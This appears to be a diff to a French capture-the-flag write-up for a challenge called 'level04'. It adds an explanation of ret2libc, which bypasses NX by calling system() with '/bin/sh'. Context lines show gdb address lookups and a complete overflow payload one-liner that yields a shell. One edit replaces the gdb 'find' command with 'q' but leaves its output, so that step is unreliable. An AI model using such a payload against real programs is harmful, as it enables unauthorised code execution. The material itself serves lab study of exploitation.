@@ -34,6 +34,41 @@ eip : 0x46464646 (soit "FFFF")
 # L'EIP commence à l'octet 157. L'offset est donc 156.
 
 4. RÉCUPÉRATION DES ADRESSES LIBC (RET2LIBC)
+
+La technique **Ret2Libc** (Return-to-libc) est la botte secrète de l'attaquant lorsque 
+les protections modernes empêchent d'exécuter du code injecté (shellcode) directement sur la pile.
+
+C'est une variante de l'attaque par **Buffer Overflow** qui ne repose pas sur l'injection de code, 
+mais sur le **détournement** de code déjà présent dans la mémoire du programme.
+
+
+### 1\. Pourquoi utiliser Ret2Libc ?
+
+Autrefois, on injectait un shellcode sur la pile et on sautait dessus. 
+Pour contrer cela, les systèmes ont implémenté le bit **NX (No-eXecute)** ou **DEP (Data Execution Prevention)**.
+
+-   **Le principe du NX :** La pile est faite pour stocker des données, 
+pas pour exécuter des instructions. Si le processeur essaie d'exécuter du code sur la pile, le programme crash.
+
+**La solution Ret2Libc :** Puisqu'on ne peut pas créer de nouveau code, 
+on utilise celui qui est déjà là. La bibliothèque standard C (`libc`) 
+est chargée par presque tous les programmes Linux et contient des fonctions "prêtes à l'emploi" comme `system()`.
+
+* * *
+
+### 2\. Le fonctionnement théorique (Architecture 32 bits)
+
+En 32 bits (x86), les arguments des fonctions sont passés par la **pile**. 
+L'attaquant doit donc construire une pile "artificielle" qui imite un appel de fonction légitime.
+
+Lorsqu'une fonction se termine (instruction `ret`), 
+elle prend l'adresse située au sommet de la pile et saute dessus. On va donc placer :
+
+1.  **L'adresse de `system()`** : Pour écraser l'adresse de retour (EIP).
+2.  **L'adresse de `exit()`** (optionnel) : Pour que le programme quitte proprement après le shell (évite un Segfault immédiat).
+3.  **L'adresse de la chaîne `"/bin/sh"`** : C'est l'argument que `system()` va lire.
+
+
 --------------------------------------------
 On ne peut pas utiliser de shellcode à cause du ptrace. On utilise donc
 la technique Ret2Libc pour sauter dans la fonction 'system()' de la libc.
@@ -53,7 +88,7 @@ $2 = 0xf7e5eb70
 # 3. Adresse de la chaîne "/bin/sh"
 (gdb) info proc mappings
 # On repère la plage de la libc : 0xf7e2c000 à 0xf7fcc000
-(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+(gdb) q
 $3 = 0xf7f897ec
 
 5. CONSTRUCTION DU PAYLOAD
@@ -75,6 +110,7 @@ COMMANDE FINALE :
 (python -c "import sys; sys.stdout.write('A'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')"; cat) | ./level04
 
 7. OBTENTION DU FLAG
+
 --------------------
 Give me some shellcode, k
 whoami
